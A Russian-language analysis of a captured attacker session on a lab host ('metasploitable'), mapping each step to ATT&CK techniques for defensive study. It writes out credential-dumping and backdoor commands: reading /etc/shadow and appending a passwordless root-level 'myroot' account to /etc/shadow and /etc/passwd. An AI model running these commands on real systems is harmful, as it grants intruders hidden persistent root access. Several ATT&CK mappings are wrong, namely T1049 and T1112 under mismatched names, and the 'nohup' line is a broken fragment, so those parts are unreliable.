# Разбор захваченного сеанса (Security Onion)

> **Легенда формата**  
> `SRC:` — команда, отправленная злоумышленником  
> `DST:` — ответ системы  

---



## 1. Получение интерактивного root-шелла
DST: uid=0(root) gid=0(root)

*Позиция в ATT&CK:* **T1059 — Command-Line Interface**  
Злоумышленник уже имеет UID 0, то есть полный контроль над хостом **metasploitable**.

---

## 2. Подготовка фона
SRC: nohup >/dev/null 2>&1

Команда-заглушка: запуск будущих процессов в фоне с перенаправлением вывода.  
**Цель:** скрыть артефакты в логах и обеспечить устойчивость после выхода.

---

## 3. Проверка связи / установка маркера
SRC: echo qeQCrFL4JOPD9Kzc
DST: qeQCrFL4JOPD9Kzc

Одноразовый «бейкон» — быстрая проверка, что команды исполняются, либо метка для последующей корреляции сетевого трафика.

---

## 4. Подтверждение прав и разведка окружения
SRC: whoami → DST: root
SRC: hostname → DST: metasploitable
SRC: ifconfig → DST: eth0 … inet 209.165.200.235/27

*Позиции в ATT&CK:*

| Техника | ID |
|---------|----|
| System Owner/User Discovery | **T1033** |
| System Information Discovery | **T1082** |
| Network Interface Enumeration | **T1049** |

Злоумышленник убеждается, что находится на нужной машине, и фиксирует IP-адрес для последующего доступа или туннелей.

---

## 5. Дамп хешей паролей
SRC: cat /etc/shadow

*Позиция:* **T1003 — OS Credential Dumping**  
Собран полный список учётных записей; хеши можно отправить во внешнюю систему для off-line взлома.

---

## 6. Закладка бэкдора через «теневые» учётные записи
SRC: echo "myroot::14747:0:99999:7:::" >> /etc/shadow
SRC: echo "myroot:x:0:0:root:/root:/bin/bash" >> /etc/passwd

*Позиции:* **T1098 — Account Manipulation**, **T1112 — Modify System Files**

| Файл | Запись | Эффект |
|------|--------|--------|
| `/etc/passwd` | `myroot:x:0:0:root:/root:/bin/bash` | Логическая привязка имени к UID/GID 0 (права root) |
| `/etc/shadow` | `myroot::…` (пустой пароль) | Авторизация возможна без пароля или с любым, если PAM трактует пустой хеш как *null-auth* |

Злоумышленник получает **устойчивый, малозаметный root-доступ**, даже если исходный пароль root будет сменён.

---

## 7. Завершение сеанса
SRC: exit

После внесения изменений атакующий выходит: это минимизирует «шум» в логах и следы активности.

